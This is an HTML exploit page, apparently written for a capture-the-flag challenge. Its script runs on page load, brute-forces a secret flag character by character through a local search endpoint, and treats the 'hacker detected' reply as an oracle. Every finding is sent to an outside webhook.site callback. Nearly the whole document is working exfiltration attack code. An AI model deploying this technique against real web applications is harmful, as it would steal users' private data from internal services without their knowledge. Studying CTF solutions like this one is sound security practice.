<!DOCTYPE html>
<html>
<head>
    <title>Flag Extractor</title>
</head>
<body>
    <h1>Extracting Flag...</h1>
    <div id="status"></div>
    <div id="flag"></div>
    
    <script>
        // Replace with your callback server URL (e.g., webhook.site)
        const CALLBACK_URL = '	https://webhook.site/11e453b1-e116-4947-9501-3016aceedae5';
        
        const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!@#$%^&*()';
        let knownFlag = 'BOH25{';
        let currentCharIndex = 0;
        let found = false;
        
        function updateStatus(msg) {
            document.getElementById('status').innerHTML = msg;
            console.log(msg);
        }
        
        function updateFlag(flag) {
            document.getElementById('flag').innerHTML = '<h2>Flag: ' + flag + '</h2>';
        }
        
        function sendToCallback(data) {
            // Send data to callback server
            fetch(CALLBACK_URL + '?data=' + encodeURIComponent(JSON.stringify(data)), {
                method: 'GET',
                mode: 'no-cors'
            }).catch(e => console.log('Callback sent (may fail due to CORS)'));
        }
        
        async function testCharacter(char) {
            const query = knownFlag + char;
            updateStatus('Testing: ' + query);
            
            try {
                // Make request to search endpoint
                const response = await fetch('http://127.0.0.1:5000/search?q=' + encodeURIComponent(query), {
                    method: 'GET',
                    redirect: 'manual'  // Don't follow redirects automatically
                });
                
                // Check response
                if (response.status === 200) {
                    const text = await response.text();
                    if (text.includes('hacker detected')) {
                        // This query is in the flag!
                        updateStatus('Found character: ' + char);
                        sendToCallback({type: 'found', char: char, query: query});
                        return true;
                    }
                } else if (response.status === 302) {
                    // Redirect means query is NOT in flag (or only partially)
                    // But we need to check if this is the right character
                    const location = response.headers.get('Location');
                    sendToCallback({type: 'redirect', char: char, query: query, location: location});
                    return false;
                }
            } catch (error) {
                console.error('Error:', error);
                sendToCallback({type: 'error', char: char, query: query, error: error.message});
                return false;
            }
            
            return false;
        }
        
        async function bruteForce() {
            updateStatus('Starting brute force...');
            updateFlag(knownFlag);
            sendToCallback({type: 'start', knownFlag: knownFlag});
            
            while (!found && knownFlag.length < 50) {
                let foundChar = false;
                
                // Test each character
                for (let i = 0; i < charset.length; i++) {
                    const char = charset[i];
                    const isInFlag = await testCharacter(char);
                    
                    if (isInFlag) {
                        // This character causes "hacker detected"
                        // But we need to determine if it's the NEXT character or just appears later
                        // Let's try a different approach: test if knownFlag + char is a substring
                        
                        // Actually, if "hacker detected", it means the query appears in the flag
                        // So knownFlag + char must be in the flag
                        // This could mean:
                        // 1. char is the next character (what we want)
                        // 2. char appears later in the flag (false positive)
                        
                        // To disambiguate, we can test if knownFlag + char + 'z' (not in flag) also triggers
                        // If it does, then char is not necessarily the next character
                        
                        // For now, let's assume it's the next character if the previous character didn't trigger
                        knownFlag += char;
                        updateFlag(knownFlag);
                        sendToCallback({type: 'progress', flag: knownFlag});
                        foundChar = true;
                        
                        // Check if flag is complete
                        if (char === '}') {
                            found = true;
                            updateStatus('Flag found: ' + knownFlag);
                            sendToCallback({type: 'complete', flag: knownFlag});
                            break;
                        }
                        
                        break; // Move to next position
                    }
                    
                    // Small delay to avoid overwhelming
                    await new Promise(resolve => setTimeout(resolve, 100));
                }
                
                if (!foundChar) {
                    updateStatus('Could not find next character. Current flag: ' + knownFlag);
                    sendToCallback({type: 'stuck', flag: knownFlag});
                    break;
                }
            }
            
            if (found) {
                updateStatus('Flag extraction complete!');
            }
        }
        
        // Start the brute force
        setTimeout(() => {
            bruteForce();
        }, 1000);
    </script>
</body>
</html>

